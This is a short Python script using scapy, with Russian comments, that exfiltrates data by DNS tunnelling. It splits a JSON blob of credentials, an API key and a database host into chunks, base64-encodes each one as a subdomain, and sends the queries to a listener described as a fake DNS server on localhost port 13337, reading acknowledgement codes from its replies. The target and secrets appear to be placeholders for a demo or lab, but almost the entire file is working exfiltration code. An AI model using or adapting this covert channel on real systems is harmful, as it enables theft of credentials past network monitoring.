# /// script
# requires-python = ">=3.10"
# dependencies = ["scapy"]
# ///


from scapy.all import *
from base64 import b64encode 

ip = "127.0.0.1"
port = 13337
domain = "google.com"
chunkLength = 24
data = '{"user": "admin", "password": "SuperSecretPass123!", "api_key": "sk-9876543210abcdef", "db_host": "10.0.0.5"}'

def process(response):
    if response.haslayer(DNS) and response[DNS].ancount > 0:
        # an - секция answer, rdata - данные в ней
        code = str(response[DNS].an.rdata)[-1]
        if int(code) == 1: # логика подставного DNS сервера
            print("Recieved successfully")
        elif int(code) == 2:
            print("Acknowledged end transmission")
        else:
            print("Transmission error")

def DNSRequest(subdomain):
    global domain
    d = bytes(subdomain + "." + domain, "utf-8")
    query = DNSQR(qname = d)
    # DNSQR = Question Section
    # внутри QNAME(имя запр. домена), QTYPE(тип запр. записи)
    # QCLASS класс сети - почти всегда IN(internet)
    p = IP(dst = bytes(ip, "utf-8")) / UDP(dport = port) / DNS(qd = query)
    result = sr1(p, verbose = False) # отправляем пакет, и ждем первый ответный 
    process(result)

def sendData(data):
    for i in range(0, len(data), chunkLength):
        chunk = data[i:min(i + chunkLength, len(data))]
        print(f"Transmitting {chunk}")
        encoded = b64encode(bytes(chunk, "utf-8"))
        encoded = encoded.decode("utf-8").strip("=")
        DNSRequest(encoded)
    print("Sending end marker (R)")
    DNSRequest("R")

sendData(data)


sendData(data)
